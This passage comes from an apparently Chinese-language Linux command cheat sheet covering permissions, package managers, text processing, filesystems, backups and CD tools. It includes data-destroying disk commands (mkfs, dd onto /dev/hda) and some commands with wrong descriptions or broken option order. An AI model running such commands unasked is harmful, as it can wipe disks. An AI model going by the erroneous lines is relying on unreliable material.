class="hljs-string">&#x27;/etc/passwd&#x27;</span> 的文件格式和语法修正以及存在的群组<br>newgrp group_name 登陆进一个新的群组以改变新创建文件的预设群组<br></code></pre></td></tr></table></figure><ol><li>文件的权限  使用 “+” 设置权限，使用 “-” 用于取消</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -lh 显示权限<br><span class="hljs-built_in">ls</span> /tmp | <span class="hljs-built_in">pr</span> -T5 -W<span class="hljs-variable">$COLUMNS</span> 将终端划分成5栏显示<br><span class="hljs-built_in">chmod</span> ugo+rwx directory1 设置目录的所有人(u)、群组(g)以及其他人(o)以读（r ）、写(w)和执行(x)的权限<br><span class="hljs-built_in">chmod</span> go-rwx directory1 删除群组(g)与其他人(o)对目录的读写执行权限<br><span class="hljs-built_in">chown</span> user1 file1 改变一个文件的所有人属性<br><span class="hljs-built_in">chown</span> -R user1 directory1 改变一个目录的所有人属性并同时改变改目录下所有文件的属性<br><span class="hljs-built_in">chgrp</span> group1 file1 改变文件的群组<br><span class="hljs-built_in">chown</span> user1:group1 file1 改变一个文件的所有人和群组属性<br>find / -perm -u+s 罗列一个系统中所有使用了SUID控制的文件<br><span class="hljs-built_in">chmod</span> u+s /bin/file1 设置一个二进制文件的 SUID 位 - 运行该文件的用户也被赋予和所有者同样的权限<br><span class="hljs-built_in">chmod</span> u-s /bin/file1 禁用一个二进制文件的 SUID位<br><span class="hljs-built_in">chmod</span> g+s /home/public 设置一个目录的SGID 位 - 类似SUID ，不过这是针对目录的<br><span class="hljs-built_in">chmod</span> g-s /home/public 禁用一个目录的 SGID 位<br><span class="hljs-built_in">chmod</span> o+t /home/public 设置一个文件的 STIKY 位 - 只允许合法所有人删除文件<br><span class="hljs-built_in">chmod</span> o-t /home/public 禁用一个目录的 STIKY 位<br><span class="hljs-built_in">chmod</span> +x 文件路径 为所有者、所属组和其他用户添加执行的权限<br><span class="hljs-built_in">chmod</span> -x 文件路径 为所有者、所属组和其他用户删除执行的权限<br><span class="hljs-built_in">chmod</span> u+x 文件路径 为所有者添加执行的权限<br><span class="hljs-built_in">chmod</span> g+x 文件路径 为所属组添加执行的权限<br><span class="hljs-built_in">chmod</span> o+x 文件路径 为其他用户添加执行的权限<br><span class="hljs-built_in">chmod</span> ug+x 文件路径 为所有者、所属组添加执行的权限<br><span class="hljs-built_in">chmod</span> =wx 文件路径 为所有者、所属组和其他用户添加写、执行的权限，取消读权限<br><span class="hljs-built_in">chmod</span> ug=wx 文件路径 为所有者、所属组添加写、执行的权限，取消读权限<br></code></pre></td></tr></table></figure><ol><li>文件的特殊属性 ，使用 “+” 设置权限，使用 “-” 用于取消</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css">chattr +<span class="hljs-selector-tag">a</span> file1 只允许以追加方式读写文件<br>chattr +c file1 允许这个文件能被内核自动压缩/解压<br>chattr +d file1 在进行文件系统备份时，dump程序将忽略这个文件<br>chattr +<span class="hljs-selector-tag">i</span> file1 设置成不可变的文件，不能被删除、修改、重命名或者链接<br>chattr +s file1 允许一个文件被安全地删除<br>chattr +S file1 一旦应用程序对这个文件执行了写操作，使系统立刻把修改的结果写到磁盘<br>chattr +u file1 若文件被删除，系统会允许你在以后恢复这个被删除的文件<br>lsattr 显示特殊的属性<br></code></pre></td></tr></table></figure><ol><li>打包和压缩文件</li></ol><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs stylus">bunzip2 file1<span class="hljs-selector-class">.bz2</span> 解压一个叫做 <span class="hljs-string">&#x27;file1.bz2&#x27;</span>的文件<br>bzip2 file1 压缩一个叫做 <span class="hljs-string">&#x27;file1&#x27;</span> 的文件<br>gunzip file1<span class="hljs-selector-class">.gz</span> 解压一个叫做 <span class="hljs-string">&#x27;file1.gz&#x27;</span>的文件<br>gzip file1 压缩一个叫做 <span class="hljs-string">&#x27;file1&#x27;</span>的文件<br>gzip -<span class="hljs-number">9</span> file1 最大程度压缩<br>rar <span class="hljs-selector-tag">a</span> file1<span class="hljs-selector-class">.rar</span> test_file 创建一个叫做 <span class="hljs-string">&#x27;file1.rar&#x27;</span> 的包<br>rar <span class="hljs-selector-tag">a</span> file1<span class="hljs-selector-class">.rar</span> file1 file2 dir1 同时压缩 <span class="hljs-string">&#x27;file1&#x27;</span>, <span class="hljs-string">&#x27;file2&#x27;</span> 以及目录 <span class="hljs-string">&#x27;dir1&#x27;</span><br>rar x file1<span class="hljs-selector-class">.rar</span> 解压rar包<br>unrar x file1<span class="hljs-selector-class">.rar</span> 解压rar包<br>tar -cvf archive<span class="hljs-selector-class">.tar</span> file1 创建一个非压缩的 tarball<br>tar -cvf archive<span class="hljs-selector-class">.tar</span> file1 file2 dir1 创建一个包含了 <span class="hljs-string">&#x27;file1&#x27;</span>, <span class="hljs-string">&#x27;file2&#x27;</span> 以及 <span class="hljs-string">&#x27;dir1&#x27;</span>的档案文件<br>tar -tf archive<span class="hljs-selector-class">.tar</span> 显示一个包中的内容<br>tar -xvf archive<span class="hljs-selector-class">.tar</span> 释放一个包<br>tar -xvf archive<span class="hljs-selector-class">.tar</span> -C /tmp 将压缩包释放到 /tmp目录下<br>tar -cvfj archive<span class="hljs-selector-class">.tar</span><span class="hljs-selector-class">.bz2</span> dir1 创建一个bzip2格式的压缩包<br>tar -xvfj archive<span class="hljs-selector-class">.tar</span><span class="hljs-selector-class">.bz2</span> 解压一个bzip2格式的压缩包<br>tar -cvfz archive<span class="hljs-selector-class">.tar</span><span class="hljs-selector-class">.gz</span> dir1 创建一个gzip格式的压缩包<br>tar -xvfz archive<span class="hljs-selector-class">.tar</span><span class="hljs-selector-class">.gz</span> 解压一个gzip格式的压缩包<br>zip file1<span class="hljs-selector-class">.zip</span> file1 创建一个zip格式的压缩包<br>zip -r file1<span class="hljs-selector-class">.zip</span> file1 file2 dir1 将几个文件和目录同时压缩成一个zip格式的压缩包<br>unzip file1<span class="hljs-selector-class">.zip</span> 解压一个zip格式压缩包<br></code></pre></td></tr></table></figure><ol><li>RPM 包</li></ol><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs gradle">rpm -ivh <span class="hljs-keyword">package</span>.rpm 安装一个rpm包<br>rpm -ivh --nodeeps <span class="hljs-keyword">package</span>.rpm 安装一个rpm包而忽略依赖关系警告<br>rpm -U <span class="hljs-keyword">package</span>.rpm 更新一个rpm包但不改变其配置文件<br>rpm -F <span class="hljs-keyword">package</span>.rpm 更新一个确定已经安装的rpm包<br>rpm -e package_name.rpm 删除一个rpm包<br>rpm -qa 显示系统中所有已经安装的rpm包<br>rpm -qa | <span class="hljs-keyword">grep</span> httpd 显示所有名称中包含 <span class="hljs-string">&quot;httpd&quot;</span> 字样的rpm包<br>rpm -qi package_name 获取一个已安装包的特殊信息<br>rpm -qg <span class="hljs-string">&quot;System Environment/Daemons&quot;</span> 显示一个组件的rpm包<br>rpm -ql package_name 显示一个已经安装的rpm包提供的文件列表<br>rpm -qc package_name 显示一个已经安装的rpm包提供的配置文件列表<br>rpm -q package_name --whatrequires 显示与一个rpm包存在依赖关系的列表<br>rpm -q package_name --whatprovides 显示一个rpm包所占的体积<br>rpm -q package_name --scripts 显示在安装/删除期间所执行的脚本l<br>rpm -q package_name --changelog 显示一个rpm包的修改历史<br>rpm -qf <span class="hljs-regexp">/etc/</span>httpd<span class="hljs-regexp">/conf/</span>httpd.conf 确认所给的文件由哪个rpm包所提供<br>rpm -qp <span class="hljs-keyword">package</span>.rpm -l 显示由一个尚未安装的rpm包提供的文件列表<br>rpm --<span class="hljs-keyword">import</span> <span class="hljs-regexp">/media/</span>cdrom/RPM-GPG-KEY 导入公钥数字证书<br>rpm --checksig <span class="hljs-keyword">package</span>.rpm 确认一个rpm包的完整性<br>rpm -qa gpg-pubkey 确认已安装的所有rpm包的完整性<br>rpm -V package_name 检查文件尺寸、 许可、类型、所有者、群组、MD5检查以及最后修改时间<br>rpm -Va 检查系统中所有已安装的rpm包- 小心使用<br>rpm -Vp <span class="hljs-keyword">package</span>.rpm 确认一个rpm包还未安装<br>rpm2cpio <span class="hljs-keyword">package</span>.rpm | cpio --extract --make-directories *bin* 从一个rpm包运行可执行文件<br>rpm -ivh <span class="hljs-regexp">/usr/</span>src<span class="hljs-regexp">/redhat/</span>RPMS<span class="hljs-regexp">/`arch`/</span><span class="hljs-keyword">package</span>.rpm 从一个rpm源码安装一个构建好的包<br>rpmbuild --rebuild package_name.src.rpm 从一个rpm源码构建一个 rpm 包<br></code></pre></td></tr></table></figure><ol><li>YUM 软件包升级器</li></ol><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">yum install <span class="hljs-keyword">package</span><span class="hljs-number">_n</span>ame 下载并安装一个rpm包<br>yum localinstall <span class="hljs-keyword">package</span><span class="hljs-number">_n</span>ame.rpm 将安装一个rpm包，使用你自己的软件仓库为你解决所有依赖关系<br>yum update <span class="hljs-keyword">package</span><span class="hljs-number">_n</span>ame.rpm 更新当前系统中所有安装的rpm包<br>yum update <span class="hljs-keyword">package</span><span class="hljs-number">_n</span>ame 更新一个rpm包<br>yum remove <span class="hljs-keyword">package</span><span class="hljs-number">_n</span>ame 删除一个rpm包<br>yum list 列出当前系统中安装的所有包<br>yum search <span class="hljs-keyword">package</span><span class="hljs-number">_n</span>ame 在rpm仓库中搜寻软件包<br>yum clean packages 清理rpm缓存删除下载的包<br>yum clean headers 删除所有头文件<br>yum clean all 删除所有缓存的包和头文件<br></code></pre></td></tr></table></figure><ol><li>deb 包</li></ol><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs vim">dpkg -i package.<span class="hljs-keyword">deb</span> 安装/更新一个 <span class="hljs-keyword">deb</span> 包<br>dpkg -r package_name 从系统删除一个 <span class="hljs-keyword">deb</span> 包<br>dpkg -<span class="hljs-keyword">l</span> 显示系统中所有已经安装的 <span class="hljs-keyword">deb</span> 包<br>dpkg -<span class="hljs-keyword">l</span> | <span class="hljs-keyword">grep</span> httpd 显示所有名称中包含 <span class="hljs-string">&quot;httpd&quot;</span> 字样的<span class="hljs-keyword">deb</span>包<br>dpkg -s package_name 获得已经安装在系统中一个特殊包的信息<br>dpkg -L package_name 显示系统中已经安装的一个<span class="hljs-keyword">deb</span>包所提供的文件列表<br>dpkg --contents package.<span class="hljs-keyword">deb</span> 显示尚未安装的一个包所提供的文件列表<br>dpkg -S /bin/ping 确认所给的文件由哪个<span class="hljs-keyword">deb</span>包提供<br>APT 软件工具 (Debian, Ubuntu 以及类似系统)<br>apt-<span class="hljs-built_in">get</span> install package_name 安装/更新一个 <span class="hljs-keyword">deb</span> 包<br>apt-cdrom install package_name 从光盘安装/更新一个 <span class="hljs-keyword">deb</span> 包<br>apt-<span class="hljs-built_in">get</span> <span class="hljs-keyword">update</span> 升级列表中的软件包<br>apt-<span class="hljs-built_in">get</span> upgrade 升级所有已安装的软件<br>apt-<span class="hljs-built_in">get</span> <span class="hljs-built_in">remove</span> package_name 从系统删除一个<span class="hljs-keyword">deb</span>包<br>apt-<span class="hljs-built_in">get</span> check 确认依赖的软件仓库正确<br>apt-<span class="hljs-built_in">get</span> clean 从下载的软件包中清理缓存<br>apt-cache <span class="hljs-built_in">search</span> searched-package 返回包含所要搜索字符串的软件包名称<br></code></pre></td></tr></table></figure><ol><li>查看文件内容</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> file1 从第一个字节开始正向查看文件的内容<br><span class="hljs-built_in">tac</span> file1 从最后一行开始反向查看一个文件的内容<br>more file1 查看一个长文件的内容<br>less file1 类似于 <span class="hljs-string">&#x27;more&#x27;</span> 命令，但是它允许在文件中和正向操作一样的反向操作<br><span class="hljs-built_in">head</span> -2 file1 查看一个文件的前两行<br><span class="hljs-built_in">tail</span> -2 file1 查看一个文件的最后两行<br><span class="hljs-built_in">tail</span> -f /var/log/messages 实时查看被添加到一个文件中的内容<br></code></pre></td></tr></table></figure><ol><li>文本处理</li></ol><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cat</span> file1 file2 ... | <span class="hljs-keyword">command</span> &lt;&gt; file1_in.txt_or_file1_out.txt general <span class="hljs-keyword">syntax</span> <span class="hljs-keyword">for</span> text manipulation using PIPE, STDIN <span class="hljs-built_in">and</span> STDOUT<br><span class="hljs-keyword">cat</span> file1 | <span class="hljs-keyword">command</span>( sed, <span class="hljs-keyword">grep</span>, awk, <span class="hljs-keyword">grep</span>, etc...) &gt; result.txt 合并一个文件的详细说明文本，并将简介写入一个新文件中<br><span class="hljs-keyword">cat</span> file1 | <span class="hljs-keyword">command</span>( sed, <span class="hljs-keyword">grep</span>, awk, <span class="hljs-keyword">grep</span>, etc...) &gt;&gt; result.txt 合并一个文件的详细说明文本，并将简介写入一个已有的文件中<br><span class="hljs-keyword">grep</span> Aug /var/<span class="hljs-built_in">log</span>/<span class="hljs-keyword">messages</span> 在文件 <span class="hljs-string">&#x27;/var/log/messages&#x27;</span>中查找关键词<span class="hljs-string">&quot;Aug&quot;</span><br><span class="hljs-keyword">grep</span> ^Aug /var/<span class="hljs-built_in">log</span>/<span class="hljs-keyword">messages</span> 在文件 <span class="hljs-string">&#x27;/var/log/messages&#x27;</span>中查找以<span class="hljs-string">&quot;Aug&quot;</span>开始的词汇<br><span class="hljs-keyword">grep</span> [<span class="hljs-number">0</span>-<span class="hljs-number">9</span>] /var/<span class="hljs-built_in">log</span>/<span class="hljs-keyword">messages</span> 选择 <span class="hljs-string">&#x27;/var/log/messages&#x27;</span> 文件中所有包含数字的行<br><span class="hljs-keyword">grep</span> Aug -R /var/<span class="hljs-built_in">log</span>/* 在目录 <span class="hljs-string">&#x27;/var/log&#x27;</span> 及随后的目录中搜索字符串<span class="hljs-string">&quot;Aug&quot;</span><br>sed <span class="hljs-string">&#x27;s/stringa1/stringa2/g&#x27;</span> example.txt 将example.txt文件中的 <span class="hljs-string">&quot;string1&quot;</span> 替换成 <span class="hljs-string">&quot;string2&quot;</span><br>sed <span class="hljs-string">&#x27;/^$/d&#x27;</span> example.txt 从example.txt文件中删除所有空白行<br>sed <span class="hljs-string">&#x27;/ *#/d; /^$/d&#x27;</span> example.txt 从example.txt文件中删除所有注释和空白行<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;esempio&#x27;</span> | <span class="hljs-keyword">tr</span> <span class="hljs-string">&#x27;[:lower:]&#x27;</span> <span class="hljs-string">&#x27;[:upper:]&#x27;</span> 合并上下单元格内容<br>sed -<span class="hljs-keyword">e</span> <span class="hljs-string">&#x27;1d&#x27;</span> result.txt 从文件example.txt 中排除第一行<br>sed -n <span class="hljs-string">&#x27;/stringa1/p&#x27;</span> 查看只包含词汇 <span class="hljs-string">&quot;string1&quot;</span>的行<br>sed -<span class="hljs-keyword">e</span> <span class="hljs-string">&#x27;s/ *$//&#x27;</span> example.txt 删除每一行最后的空白字符<br>sed -<span class="hljs-keyword">e</span> <span class="hljs-string">&#x27;s/stringa1//g&#x27;</span> example.txt 从文档中只删除词汇 <span class="hljs-string">&quot;string1&quot;</span> 并保留剩余全部<br>sed -n <span class="hljs-string">&#x27;1,5p;5q&#x27;</span> example.txt 查看从第一行到第<span class="hljs-number">5</span>行内容<br>sed -n <span class="hljs-string">&#x27;5p;5q&#x27;</span> example.txt 查看第<span class="hljs-number">5</span>行<br>sed -<span class="hljs-keyword">e</span> <span class="hljs-string">&#x27;s/00*/0/g&#x27;</span> example.txt 用单个零替换多个零<br><span class="hljs-keyword">cat</span> -n file1 标示文件的行数<br><span class="hljs-keyword">cat</span> example.txt | awk <span class="hljs-string">&#x27;NR%2==1&#x27;</span> 删除example.txt文件中的所有偶数行<br><span class="hljs-keyword">echo</span> <span class="hljs-keyword">a</span> <span class="hljs-keyword">b</span> <span class="hljs-keyword">c</span> | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> 查看一行第一栏<br><span class="hljs-keyword">echo</span> <span class="hljs-keyword">a</span> <span class="hljs-keyword">b</span> <span class="hljs-keyword">c</span> | awk <span class="hljs-string">&#x27;&#123;print $1,$3&#125;&#x27;</span> 查看一行的第一和第三栏<br>paste file1 file2 合并两个文件或两栏的内容<br>paste -d <span class="hljs-string">&#x27;+&#x27;</span> file1 file2 合并两个文件或两栏的内容，中间用<span class="hljs-string">&quot;+&quot;</span>区分<br><span class="hljs-keyword">sort</span> file1 file2 排序两个文件的内容<br><span class="hljs-keyword">sort</span> file1 file2 | uniq 取出两个文件的并集(重复的行只保留一份)<br><span class="hljs-keyword">sort</span> file1 file2 | uniq -<span class="hljs-keyword">u</span> 删除交集，留下其他的行<br><span class="hljs-keyword">sort</span> file1 file2 | uniq -d 取出两个文件的交集(只留下同时存在于两个文件中的文件)<br>comm -<span class="hljs-number">1</span> file1 file2 比较两个文件的内容只删除 <span class="hljs-string">&#x27;file1&#x27;</span> 所包含的内容<br>comm -<span class="hljs-number">2</span> file1 file2 比较两个文件的内容只删除 <span class="hljs-string">&#x27;file2&#x27;</span> 所包含的内容<br>comm -<span class="hljs-number">3</span> file1 file2 比较两个文件的内容只删除两个文件共有的部分<br></code></pre></td></tr></table></figure><ol><li>字符设置和文件格式转换</li></ol><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata">dos2unix filedos.txt fileunix.txt 将一个文本文件的格式从MSDOS转换成UNIX<br>unix2dos fileunix.txt filedos.txt 将一个文本文件的格式从UNIX转换成MSDOS<br><span class="hljs-keyword">recode</span> ..HTML &lt; page.txt &gt; page.html 将一个文本文件转换成html<br><span class="hljs-keyword">recode</span> -<span class="hljs-keyword">l</span> | <span class="hljs-keyword">more</span> 显示所有允许的转换格式<br></code></pre></td></tr></table></figure><ol><li>文件系统分析</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk">badblocks -v <span class="hljs-regexp">/dev/</span>hda1 检查磁盘hda1上的坏磁块<br>fsck <span class="hljs-regexp">/dev/</span>hda1 修复/检查hda1磁盘上linux文件系统的完整性<br>fsck.ext2 <span class="hljs-regexp">/dev/</span>hda1 修复/检查hda1磁盘上ext2文件系统的完整性<br>e2fsck <span class="hljs-regexp">/dev/</span>hda1 修复/检查hda1磁盘上ext2文件系统的完整性<br>e2fsck -j <span class="hljs-regexp">/dev/</span>hda1 修复/检查hda1磁盘上ext3文件系统的完整性<br>fsck.ext3 <span class="hljs-regexp">/dev/</span>hda1 修复/检查hda1磁盘上ext3文件系统的完整性<br>fsck.vfat <span class="hljs-regexp">/dev/</span>hda1 修复/检查hda1磁盘上fat文件系统的完整性<br>fsck.msdos <span class="hljs-regexp">/dev/</span>hda1 修复/检查hda1磁盘上dos文件系统的完整性<br>dosfsck <span class="hljs-regexp">/dev/</span>hda1 修复/检查hda1磁盘上dos文件系统的完整性<br></code></pre></td></tr></table></figure><ol><li>初始化一个文件系统</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">mkfs <span class="hljs-regexp">/dev/</span>hda1 在hda1分区创建一个文件系统<br>mke2fs <span class="hljs-regexp">/dev/</span>hda1 在hda1分区创建一个linux ext2的文件系统<br>mke2fs -j <span class="hljs-regexp">/dev/</span>hda1 在hda1分区创建一个linux ext3(日志型)的文件系统<br>mkfs -t vfat <span class="hljs-number">32</span> -F <span class="hljs-regexp">/dev/</span>hda1 创建一个 FAT32 文件系统<br>fdformat -n <span class="hljs-regexp">/dev/</span>fd0 格式化一个软盘<br>mkswap <span class="hljs-regexp">/dev/</span>hda3 创建一个swap文件系统<br></code></pre></td></tr></table></figure><ol><li>SWAP文件系统</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">mkswap <span class="hljs-regexp">/dev/</span>hda3 创建一个swap文件系统<br>swapon <span class="hljs-regexp">/dev/</span>hda3 启用一个新的swap文件系统<br>swapon <span class="hljs-regexp">/dev/</span>hda2 <span class="hljs-regexp">/dev/</span>hdb3 启用两个swap分区<br></code></pre></td></tr></table></figure><ol><li>备份</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">dump -0aj -f /tmp/home0.bak /home 制作一个 <span class="hljs-string">&#x27;/home&#x27;</span> 目录的完整备份<br>dump -1aj -f /tmp/home0.bak /home 制作一个 <span class="hljs-string">&#x27;/home&#x27;</span> 目录的交互式备份<br>restore -<span class="hljs-keyword">if</span> /tmp/home0.bak 还原一个交互式备份<br>rsync -rogpav --delete /home /tmp 同步两边的目录<br>rsync -rogpav -e ssh --delete /home ip_address:/tmp 通过SSH通道rsync<br>rsync -az -e ssh --delete ip_addr:/home/public /home/local 通过ssh和压缩将一个远程目录同步到本地目录<br>rsync -az -e ssh --delete /home/local ip_addr:/home/public 通过ssh和压缩将本地目录同步到远程目录<br><span class="hljs-built_in">dd</span> bs=1M <span class="hljs-keyword">if</span>=/dev/hda | gzip | ssh user@ip_addr <span class="hljs-string">&#x27;dd of=hda.gz&#x27;</span> 通过ssh在远程主机上执行一次备份本地磁盘的操作<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/sda of=/tmp/file1 备份磁盘内容到一个文件<br>tar -Puf backup.tar /home/user 执行一次对 <span class="hljs-string">&#x27;/home/user&#x27;</span> 目录的交互式备份操作<br>( <span class="hljs-built_in">cd</span> /tmp/local/ &amp;&amp; tar c . ) | ssh -C user@ip_addr <span class="hljs-string">&#x27;cd /home/share/ &amp;&amp; tar x -p&#x27;</span> 通过ssh在远程目录中复制一个目录内容<br>( tar c /home ) | ssh -C user@ip_addr <span class="hljs-string">&#x27;cd /home/backup-home &amp;&amp; tar x -p&#x27;</span> 通过ssh在远程目录中复制一个本地目录<br>tar cf - . | (<span class="hljs-built_in">cd</span> /tmp/backup ; tar xf - ) 本地将一个目录复制到另一个地方，保留原有权限及链接<br>find /home/user1 -name <span class="hljs-string">&#x27;*.txt&#x27;</span> | xargs <span class="hljs-built_in">cp</span> -av --target-directory=/home/backup/ --parents 从一个目录查找并复制所有以 <span class="hljs-string">&#x27;.txt&#x27;</span> 结尾的文件到另一个目录<br>find /var/log -name <span class="hljs-string">&#x27;*.log&#x27;</span> | tar cv --files-from=- | bzip2 &gt; log.tar.bz2 查找所有以 <span class="hljs-string">&#x27;.log&#x27;</span> 结尾的文件并做成一个bzip包<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/hda of=/dev/fd0 bs=512 count=1 做一个将 MBR (Master Boot Record)内容复制到软盘的动作<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/fd0 of=/dev/hda bs=512 count=1 从已经保存到软盘的备份中恢复MBR内容<br></code></pre></td></tr></table></figure><ol><li>光盘</li></ol><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">cdrecord -v gracetime=2 dev=<span class="hljs-string">/dev/cdrom</span> -eject blank=fast -force 清空一个可复写的光盘内容<br>mkisofs <span class="hljs-string">/dev/cdrom</span> &gt; <span class="hljs-keyword">cd</span>.iso 在磁盘上创建一个光盘的iso镜像文件<br>mkisofs <span class="hljs-string">/dev/cdrom</span> | gzip &gt; <span class="hljs-keyword">cd</span>_iso.gz 在磁盘上创建一个压缩了的光盘iso镜像文件<br>mkisofs -J -allow-leading-dots -R -V <span class="hljs-string">&quot;Label CD&quot;</span> -iso-level 4 -o <span class="hljs-string">./cd.iso</span> data_<span class="hljs-keyword">cd</span> 创建一个目录的iso镜像文件<br>cdrecord -v dev=<span class="hljs-string">/dev/cdrom</span> <span class="hljs-keyword">cd</span>.iso 刻录一个ISO镜像文件<br>gzip -dc <span class="hljs-keyword">cd</span>_iso.gz | cdrecord dev=<span class="hljs-string">/dev/cdrom</span> - 刻录一个压缩了的ISO镜像文件<br>mount -o loop <span class="hljs-keyword">cd</span>.iso <span class="hljs-string">/mnt/iso</span> 挂载一个ISO镜像文件<br>cd-paranoia -B 从一个CD光盘转录音轨到 wav 文件中<br>cd-paranoia -- <span class="hljs-string">&quot;-3&quot;</span> 从一个CD光盘转录音轨到 wav 文件中（参数-3）<br>cdrecord <span class="hljs-params">--scanbus</span> 扫描总线以识别scsi通道<br>dd <span class="hljs-keyword">if</span>=<span class="hljs-string">/dev/hdc</span> | md5sum 校验一个设备的md5sum编码，例如一张 CD<br></code></pre></td></tr></table></figure><ol><li>网络（以太网和WIFI无线）</li></ol><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs tcl">ifconfig eth0 显示一个以太网卡的配置<br>ifup 